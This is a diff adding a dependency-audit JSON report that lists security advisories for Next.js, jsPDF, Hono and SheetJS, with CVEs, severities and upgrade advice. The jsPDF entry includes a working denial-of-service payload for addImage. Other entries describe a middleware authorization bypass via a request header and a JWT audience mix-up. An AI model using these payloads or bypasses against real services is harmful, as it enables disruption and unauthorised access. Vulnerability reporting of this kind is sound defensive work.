+      "overview": "A vulnerability in Next.js Image Optimization has been fixed in v15.4.5 and v14.2.31. When images returned from API routes vary based on request headers (such as `Cookie` or `Authorization`), these responses could be incorrectly cached and served to unauthorized users due to a cache key confusion bug.\n\nAll users are encouraged to upgrade if they use API routes to serve images that depend on request headers and have image optimization enabled.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57752)",
+      "reported_by": null,
+      "title": "Next.js Affected by Cache Key Confusion for Image Optimization API Routes",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57752"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.31",
+      "github_advisory_id": "GHSA-g5qg-72qw-gw5v",
+      "recommendation": "Upgrade to version 14.2.31 or later",
+      "patched_versions": ">=14.2.31",
+      "updated": "2025-09-03T13:01:55.000Z",
+      "cvss": {
+        "score": 6.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-g5qg-72qw-gw5v"
+    },
+    "1107412": {
+      "findings": [
+        {
+          "version": "2.5.2",
+          "paths": [
+            "apps/web > jspdf@2.5.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-8mvj-3j78-4qmw\n- https://github.com/parallax/jsPDF/commit/4cf3ab619e565d9b88b4b130bff901b91d8688e9\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57810\n- https://github.com/parallax/jsPDF/pull/3880\n- https://github.com/parallax/jsPDF/releases/tag/v3.0.2\n- https://github.com/advisories/GHSA-8mvj-3j78-4qmw",
+      "created": "2025-08-26T16:19:04.000Z",
+      "id": 1107412,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nUser control of the first argument of the addImage method results in CPU utilization and denial of service.\n\nIf given the possibility to pass unsanitized image data or URLs to the addImage method, a user can provide a harmful PNG file that results in high CPU utilization and denial of service.\n\nOther affected methods are: `html`.\n\nExample payload:\n\n```js\nimport { jsPDF } from \"jspdf\" \n\nconst payload = new Uint8Array([117, 171, 90, 253, 166, 154, 105, 166, 154])\n\nconst doc = new jsPDF();\nconst startTime = performance.now();\ntry {\n  doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} finally {\n  const endTime = performance.now();\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`);\n}\n```\n\n### Patches\nThe vulnerability was fixed in jsPDF 3.0.2. Upgrade to jspdf@>=3.0.2.\n\nIn jspdf@>=3.0.2, invalid PNG files throw an Error instead of causing very long running loops.\n\n### Workarounds\nSanitize image data or URLs before passing it to the addImage method or one of the other affected methods.\n\n### Credits\nResearcher: Aleksey Solovev (Positive Technologies)",
+      "reported_by": null,
+      "title": "jsPDF Denial of Service (DoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57810"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<=3.0.1",
+      "github_advisory_id": "GHSA-8mvj-3j78-4qmw",
+      "recommendation": "Upgrade to version 3.0.2 or later",
+      "patched_versions": ">=3.0.2",
+      "updated": "2025-09-10T21:07:05.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-8mvj-3j78-4qmw"
+    },
+    "1107420": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-7gfc-8cq8-jh5f\n- https://github.com/vercel/next.js/commit/1c8234eb20bc8afd396b89999a00f06b61d72d7b\n- https://nvd.nist.gov/vuln/detail/CVE-2024-51479\n- https://github.com/vercel/next.js/releases/tag/v14.2.15\n- https://github.com/advisories/GHSA-7gfc-8cq8-jh5f",
+      "created": "2024-12-17T15:09:06.000Z",
+      "id": 1107420,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nIf a Next.js application is performing authorization in middleware based on pathname, it was possible for this authorization to be bypassed.\n\n### Patches\nThis issue was patched in Next.js `14.2.15` and later.\n\nIf your Next.js application is hosted on Vercel, this vulnerability has been automatically mitigated, regardless of Next.js version.\n\n### Workarounds\nThere are no official workarounds for this vulnerability.\n\n#### Credits\nWe'd like to thank [tyage](http://github.com/tyage) (GMO CyberSecurity by IERAE) for responsible disclosure of this issue.",
+      "reported_by": null,
+      "title": "Next.js authorization bypass vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-51479"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=9.5.5 <14.2.15",
+      "github_advisory_id": "GHSA-7gfc-8cq8-jh5f",
+      "recommendation": "Upgrade to version 14.2.15 or later",
+      "patched_versions": ">=14.2.15",
+      "updated": "2025-09-10T21:12:24.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-285",
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-7gfc-8cq8-jh5f"
+    },
+    "1107512": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-4342-x723-ch2f\n- https://github.com/vercel/next.js/commit/9c9aaed5bb9338ef31b0517ccf0ab4414f2093d8\n- https://vercel.com/changelog/cve-2025-57822\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57822\n- https://github.com/advisories/GHSA-4342-x723-ch2f",
+      "created": "2025-08-29T21:33:09.000Z",
+      "id": 1107512,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Middleware** has been fixed in **v14.2.32** and **v15.4.7**. The issue occurred when request headers were directly passed into `NextResponse.next()`. In self-hosted applications, this could allow Server-Side Request Forgery (SSRF) if certain sensitive headers from the incoming request were reflected back into the response.\n\nAll users implementing custom middleware logic in self-hosted environments are strongly encouraged to upgrade and verify correct usage of the `next()` function.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57822)",
+      "reported_by": null,
+      "title": "Next.js Improper Middleware Redirect Handling Leads to SSRF",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57822"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.32",
+      "github_advisory_id": "GHSA-4342-x723-ch2f",
+      "recommendation": "Upgrade to version 14.2.32 or later",
+      "patched_versions": ">=14.2.32",
+      "updated": "2025-09-11T15:41:03.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-4342-x723-ch2f"
+    },
+    "1107513": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-xv57-4mr9-wg8v\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- http://vercel.com/changelog/cve-2025-55173\n- https://nvd.nist.gov/vuln/detail/CVE-2025-55173\n- https://vercel.com/changelog/cve-2025-55173\n- https://github.com/advisories/GHSA-xv57-4mr9-wg8v",
+      "created": "2025-08-29T21:59:55.000Z",
+      "id": 1107513,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Image Optimization** has been fixed in **v15.4.5** and **v14.2.31**. The issue allowed attacker-controlled external image sources to trigger file downloads with arbitrary content and filenames under specific configurations. This behavior could be abused for phishing or malicious file delivery.\n\nAll users relying on `images.domains` or `images.remotePatterns` are encouraged to upgrade and verify that external image sources are strictly validated.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-55173)",
+      "reported_by": null,
+      "title": "Next.js Content Injection Vulnerability for Image Optimization",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-55173"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.31",
+      "github_advisory_id": "GHSA-xv57-4mr9-wg8v",
+      "recommendation": "Upgrade to version 14.2.31 or later",
+      "patched_versions": ">=14.2.31",
+      "updated": "2025-09-11T15:35:25.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-xv57-4mr9-wg8v"
+    },
+    "1107532": {
+      "findings": [
+        {
+          "version": "3.12.12",
+          "paths": [
+            "apps/web > hono@3.12.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-92vj-g62v-jqhh\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59139\n- https://github.com/honojs/hono/commit/605c70560b52f13af10379f79b76717042fafe8d\n- https://github.com/advisories/GHSA-92vj-g62v-jqhh",
+      "created": "2025-09-12T21:12:20.000Z",
+      "id": 1107532,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA flaw in the `bodyLimit` middleware could allow bypassing the configured request body size limit when conflicting HTTP headers were present.\n\n### Details\nThe middleware previously prioritized the `Content-Length` header even when a `Transfer-Encoding: chunked` header was also included. According to the HTTP specification, `Content-Length` must be ignored in such cases. This discrepancy could allow oversized request bodies to bypass the configured limit.\n\nMost standards-compliant runtimes and reverse proxies may reject such malformed requests with `400 Bad Request`, so the practical impact depends on the runtime and deployment environment.\n\n### Impact\nIf body size limits are used as a safeguard against large or malicious requests, this flaw could allow attackers to send oversized request bodies. The primary risk is denial of service (DoS) due to excessive memory or CPU consumption when handling very large requests.\n\n### Resolution\nThe implementation has been updated to align with the HTTP specification, ensuring that `Transfer-Encoding` takes precedence over `Content-Length`. The issue is fixed in Hono v4.9.7, and all users should upgrade immediately.",
+      "reported_by": null,
+      "title": "Hono has Body Limit Middleware Bypass",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-59139"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.9.7",
+      "github_advisory_id": "GHSA-92vj-g62v-jqhh",
+      "recommendation": "Upgrade to version 4.9.7 or later",
+      "patched_versions": ">=4.9.7",
+      "updated": "2025-09-12T21:12:21.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-92vj-g62v-jqhh"
+    },
+    "1108110": {
+      "findings": [
+        {
+          "version": "0.18.5",
+          "paths": [
+            "apps/web > xlsx@0.18.5"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-30533\n- https://cdn.sheetjs.com/advisories/CVE-2023-30533\n- https://git.sheetjs.com/sheetjs/sheetjs/src/branch/master/CHANGELOG.md\n- https://git.sheetjs.com/sheetjs/sheetjs/issues/2667\n- https://git.sheetjs.com/sheetjs/sheetjs/issues/2986\n- https://cdn.sheetjs.com\n- https://github.com/advisories/GHSA-4r6h-8v6p-xvw6",
+      "created": "2023-04-24T09:30:19.000Z",
+      "id": 1108110,
+      "npm_advisory_id": null,
+      "overview": "All versions of SheetJS CE through 0.19.2 are vulnerable to \"Prototype Pollution\" when reading specially crafted files. Workflows that do not read arbitrary files (for example, exporting data to spreadsheet files) are unaffected.\n\nA non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package `xlsx` are no longer maintained. Version 0.19.3 can be downloaded via https://cdn.sheetjs.com/.",
+      "reported_by": null,
+      "title": "Prototype Pollution in sheetJS",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-30533"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "xlsx",
+      "vulnerable_versions": "<0.19.3",
+      "github_advisory_id": "GHSA-4r6h-8v6p-xvw6",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2025-09-19T15:23:41.000Z",
+      "cvss": {
+        "score": 7.8,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-4r6h-8v6p-xvw6"
+    },
+    "1108111": {
+      "findings": [
+        {
+          "version": "0.18.5",
+          "paths": [
+            "apps/web > xlsx@0.18.5"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-22363\n- https://cdn.sheetjs.com/advisories/CVE-2024-22363\n- https://cwe.mitre.org/data/definitions/1333.html\n- https://git.sheetjs.com/sheetjs/sheetjs/src/tag/v0.20.2\n- https://cdn.sheetjs.com\n- https://github.com/advisories/GHSA-5pgg-2g8v-p4x9",
+      "created": "2024-04-05T06:30:46.000Z",
+      "id": 1108111,
+      "npm_advisory_id": null,
+      "overview": "SheetJS Community Edition before 0.20.2 is vulnerable.to Regular Expression Denial of Service (ReDoS).\n\nA non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package `xlsx` are no longer maintained. Version 0.20.2 can be downloaded via https://cdn.sheetjs.com/.",
+      "reported_by": null,
+      "title": "SheetJS Regular Expression Denial of Service (ReDoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-22363"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "xlsx",
+      "vulnerable_versions": "<0.20.2",
+      "github_advisory_id": "GHSA-5pgg-2g8v-p4x9",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2025-09-19T15:23:26.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-5pgg-2g8v-p4x9"
+    },
+    "1108291": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-qpjv-v59x-3qc4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-32421\n- https://vercel.com/changelog/cve-2025-32421\n- https://github.com/advisories/GHSA-qpjv-v59x-3qc4",
+      "created": "2025-05-15T14:12:26.000Z",
+      "id": 1108291,
+      "npm_advisory_id": null,
+      "overview": "**Summary**  \nWe received a responsible disclosure from Allam Rachid (zhero) for a low-severity race-condition vulnerability in Next.js. This issue only affects the **Pages Router** under certain misconfigurations, causing normal endpoints to serve `pageProps` data instead of standard HTML.\n\n[Learn more here](https://vercel.com/changelog/cve-2025-32421)\n\n**Credit**  \nThank you to **Allam Rachid (zhero)** for the responsible disclosure. This research was rewarded as part of our bug bounty program.",
+      "reported_by": null,
+      "title": "Next.js Race Condition to Cache Poisoning",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-32421"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.24",
+      "github_advisory_id": "GHSA-qpjv-v59x-3qc4",
+      "recommendation": "Upgrade to version 14.2.24 or later",
+      "patched_versions": ">=14.2.24",
+      "updated": "2025-09-26T17:48:30.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-qpjv-v59x-3qc4"
+    },
+    "1108953": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "apps/web > @clerk/nextjs@4.31.8 > next@14.0.4",
+            "apps/web > @sentry/nextjs@10.22.0 > next@14.0.4",
+            "apps/web > @trpc/next@10.45.2 > next@14.0.4",
+            "apps/web > next@14.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\n- https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\n- https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\n- https://nvd.nist.gov/vuln/detail/CVE-2025-29927\n- https://github.com/vercel/next.js/releases/tag/v12.3.5\n- https://github.com/vercel/next.js/releases/tag/v13.5.9\n- https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware\n- http://www.openwall.com/lists/oss-security/2025/03/23/3\n- http://www.openwall.com/lists/oss-security/2025/03/23/4\n- https://security.netapp.com/advisory/ntap-20250328-0002\n- https://github.com/advisories/GHSA-f82v-jwr5-mffw",
+      "created": "2025-03-21T15:20:12.000Z",
+      "id": 1108953,
+      "npm_advisory_id": null,
+      "overview": "# Impact\nIt is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.\n\n# Patches\n* For Next.js 15.x, this issue is fixed in `15.2.3`\n* For Next.js 14.x, this issue is fixed in `14.2.25`\n* For Next.js 13.x, this issue is fixed in 13.5.9\n* For Next.js 12.x, this issue is fixed in 12.3.5\n* For Next.js 11.x, consult the below workaround.\n\n_Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability._\n\n# Workaround\nIf patching to a safe version is infeasible, we recommend that you prevent external user requests which contain the `x-middleware-subrequest` header from reaching your Next.js application.\n\n## Credits\n\n- Allam Rachid (zhero;)\n- Allam Yasser (inzo_)",
+      "reported_by": null,
+      "title": "Authorization Bypass in Next.js Middleware",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-29927"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.0.0 <14.2.25",
+      "github_advisory_id": "GHSA-f82v-jwr5-mffw",
+      "recommendation": "Upgrade to version 14.2.25 or later",
+      "patched_versions": ">=14.2.25",
+      "updated": "2025-10-13T15:32:09.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-285",
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
+    },
+    "1109151": {
+      "findings": [
+        {
+          "version": "3.12.12",
+          "paths": [
+            "apps/web > hono@3.12.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-m732-5p4w-x69g\n- https://github.com/honojs/hono/commit/45ba3bf9e3dff8e4bd85d6b47d4b71c8d6c66bef\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62610\n- https://github.com/advisories/GHSA-m732-5p4w-x69g",
+      "created": "2025-10-22T15:21:18.000Z",
+      "id": 1109151,
+      "npm_advisory_id": null,
+      "overview": "### Improper Authorization in Hono (JWT Audience Validation)\n\nHono’s JWT authentication middleware did not validate the `aud` (Audience) claim by default. As a result, applications using the middleware without an explicit audience check could accept tokens intended for other audiences, leading to potential cross-service access (token mix-up).\n\nThe issue is addressed by adding a new `verification.aud` configuration option to allow RFC 7519–compliant audience validation. This change is classified as a **security hardening improvement**, but the lack of validation can still be considered a vulnerability in deployments that rely on default JWT verification.\n\n### Recommended secure configuration\n\nYou can enable RFC 7519–compliant audience validation using the new `verification.aud` option:\n\n```ts\nimport { Hono } from 'hono'\nimport { jwt } from 'hono/jwt'\n\nconst app = new Hono()\n\napp.use(\n  '/api/*',\n  jwt({\n    secret: 'my-secret',\n    verification: {\n      // Require this API to only accept tokens with aud = 'service-a'\n      aud: 'service-a',\n    },\n  })\n)\n```\n\nBelow is the original description by the reporter. For security reasons, it does not include PoC reproduction steps, as the vulnerability can be clearly understood from the technical description.\n\n---\n\n## The original description by the reporter\n\n### Summary\nHono’s **JWT Auth Middleware does not provide a built-in `aud` (Audience) verification option**, which can cause **confused-deputy / token-mix-up** issues: an API may accept a valid token that was **issued for a different audience** (e.g., another service) when multiple services share the same issuer/keys. This can lead to unintended cross-service access. Hono’s docs list verification options for `iss/nbf/iat/exp` only, with **no `aud` support**; RFC 7519 requires that when an `aud` claim is present, tokens **MUST** be rejected unless the processing party identifies itself in that claim.\n\n**Note:** This problem likely exists in the **JWK/JWKS-based middleware** as well (e.g., `jwk` / `verifyWithJwks`)\n\n### Details\n- The middleware’s `verifyOptions` enumerate only `iss`, `nbf`, `iat`, and `exp`; there is **no `aud` option**. The same omission appears in the JWT Helper’s “Payload Validation” list. Developers relying on the middleware for complete standards-aligned validation therefore won’t check audience by default.\n- **Standards requirement:** RFC 7519 §4.1.3 states that each principal intended to process the JWT **MUST** identify itself with a value in the `aud` claim; if it does not, the JWT **MUST** be rejected (when `aud` is present). Lack of a first-class `aud` check increases the risk that tokens issued for **Service B** are accepted by **Service A**.\n- **Real-world effect:** In deployments with a single IdP/JWKS and shared keys across multiple services, a token minted for one audience can be mistakenly accepted by another audience unless developers implement a custom audience check.\n    - For example, with Google Identity (OIDC), iss is always https://accounts.google.com (shared across apps), but aud differs per application because it is that app’s OAuth client ID; therefore, an attacker can host a separate service that supports “Sign in with Google,” obtain a valid ID token (JWT) for the victim user, and—if your API does not verify aud—use that token to access your API with the victim’s privileges.\n\n### Impact\n**Type:** Authentication/authorization weakness via **token mix-up (confused-deputy)**.\n\n**Who is impacted:** Any Hono user who:\n- shares an issuer/keys across multiple services (common with a single IdP/JWKS)\n- distinguishes tokens by intended recipient using `aud`.\n\n**What can happen:**\n- **Cross-service access:** A token for *Service B* may be accepted by *Service A*.\n- **Boundary erosion:** ID tokens and access tokens, or separate API audiences, can be inadvertently intermixed.\n    - This may causes unauthorized invocation of sensitive endpoints.\n\n**Recommended remediation:**\n1) Add `verifyOptions.aud` (`string | string[] | RegExp`) to the middleware and enforce RFC 7519 semantics: In [verify method](https://github.com/honojs/hono/blob/db764c2f1d8a2905d66c78c41aa47e47d3a4165d/src/utils/jwt/jwt.ts#L99-L156), if `aud` is present and does not match with specified audiences, reject.\n2) Ensure equivalent `aud` handling exists in the JWK/JWKS flow (`jwk` middleware / `verifyWithJwks`) so users of external IdPs can enforce audience consistently.",
+      "reported_by": null,
+      "title": "Hono Improper Authorization vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-62610"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "hono",
+      "vulnerable_versions": ">=1.1.0 <4.10.2",
+      "github_advisory_id": "GHSA-m732-5p4w-x69g",
+      "recommendation": "Upgrade to version 4.10.2 or later",
+      "patched_versions": ">=4.10.2",
+      "updated": "2025-10-23T17:38:35.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-285"
+      ],
+      "url": "https://github.com/advisories/GHSA-m732-5p4w-x69g"
+    },
+    "1109205": {
+      "findings": [
+        {
+          "version": "3.12.12",
+          "paths": [
+            "apps/web > hono@3.12.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-q7jf-gf43-6x6p\n- https://github.com/honojs/hono/commit/d9b8b4b73b4f997994f2764013207365fe711282\n- https://github.com/advisories/GHSA-q7jf-gf43-6x6p",
+      "created": "2025-10-24T19:15:13.000Z",
+      "id": 1109205,
+      "npm_advisory_id": null,
+      "overview": "### Summary  \nA flaw in the CORS middleware allowed request `Vary` headers to be reflected into the response, enabling attacker-controlled `Vary` values and potentially affecting cache behavior.\n\n### Details  \nThe middleware previously copied the `Vary` header from the request when `origin` was not set to `\"*\"`.  Since `Vary` is a response header that should only be managed by the server, this could allow an attacker to influence caching behavior or cause inconsistent CORS handling.\n\nMost environments will see impact only when shared caches or proxies rely on the `Vary` header. The practical effect varies by configuration.\n\n### Impact  \nMay cause cache key pollution and inconsistent CORS enforcement in certain setups. No direct confidentiality, integrity, or availability impact in default configurations.  \n\n### Resolution  \nUpdate to the latest patched release. The CORS middleware has been corrected to handle `Vary` exclusively as a response header.",
+      "reported_by": null,
+      "title": "Hono vulnerable to Vary Header Injection leading to potential CORS Bypass",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.10.3",
+      "github_advisory_id": "GHSA-q7jf-gf43-6x6p",
+      "recommendation": "Upgrade to version 4.10.3 or later",
+      "patched_versions": ">=4.10.3",
+      "updated": "2025-10-24T19:15:15.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-444"
+      ],
+      "url": "https://github.com/advisories/GHSA-q7jf-gf43-6x6p"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 4,
+      "moderate": 10,
+      "high": 8,
+      "critical": 1
+    },
+    "dependencies": 1410,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1410
+  }
+}
